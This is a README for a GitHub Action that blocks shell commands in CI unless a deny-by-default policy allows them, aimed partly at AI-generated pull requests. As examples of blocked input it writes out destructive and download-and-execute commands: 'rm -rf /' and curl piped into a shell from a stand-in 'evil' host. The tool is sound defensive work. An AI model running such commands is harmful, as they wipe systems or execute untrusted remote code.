# Execution Guard Action

This GitHub Action blocks any shell command that is not explicitly allowed by policy (default = DENY).

---

## 60-Second Setup

```yaml
- uses: Nick-heo-eg/execution-guard-action@v0.1.1
  with:
    policy_path: policy.yaml
```

Add this step before any shell execution. If it doesn't match policy, it will not run.

---

## Minimal Policy Example

```yaml
# policy.yaml
default: DENY

rules:
  - command: echo
    args: ['*']
    scope: safe
```

---

## Real-World Example

If an AI-generated PR tries to run `rm -rf /` or `curl malicious | bash`, this step blocks it before execution.

No changes to your workflow logic. Just add the step, define what's allowed.

---

## Quick Demo

```
echo hello      →  DECISION: ALLOW  (exits 0, command runs)
rm -rf /        →  DECISION: STOP   (exits 1, command never runs)
curl evil | sh  →  DECISION: STOP   (exits 1, command never runs)
```

Deterministic. Exact match only. No semantic parsing.

Audit: Each blocked command is logged with a proposal hash.

---

## Inputs

| Input | Default | Description |
|-------|---------|-------------|
| `command` | required | Command string to evaluate |
| `policy_path` | `./policy.yaml` | Path to your policy YAML |
| `fail_on_hold` | `true` | Exit 1 on HOLD verdict |

## Outputs

| Output | Description |
|--------|-------------|
| `verdict` | `ALLOW`, `STOP`, or `HOLD` |
| `proposal_hash` | SHA256 of execution proposal |
| `reason` | Why the verdict was issued |

---

**If you run AI-generated commands in CI, try this before your shell step.**

---

## Advanced / Design Notes

<details>
<summary>Architecture, invariant hash, and design rationale</summary>

### How it works

```
AI Step / CI Step
      │ command: "rm -rf /"
      ▼
Execution Guard  ← this action
      │ reads policy_path
      ▼
Execution Boundary Core  ← sealed engine
      │ evaluate(command, args)
      ▼
Verdict: ALLOW → spawn()  |  STOP → exit(1)
```

### Verdict model

| Verdict | Behavior |
|---------|----------|
| ALLOW | Command spawned, exits with command's exit code |
| STOP | Execution blocked, exits 1 |
| HOLD | Soft gate — fail_on_hold controls exit code |

### Core invariant

Built on a sealed Execution Boundary core. Core is **UNTOUCHED** by this adapter.

Core invariant hash: `54add9db6f88f28a81bbfd428d47fa011ad9151b91df672c3c1fa75beac32f04`

Verify: `bash scripts/verify-invariant.sh` in `execution-runtime-core`.

### Guarantee

- No policy → DENY
- Malformed policy → DENY
- Command not in policy → DENY
- Exact match only → ALLOW

### Roadmap

- [ ] HOLD verdict via policy `action: hold`
- [ ] Multi-command evaluation
- [ ] OpenTelemetry span export (optional, future only)

</details>
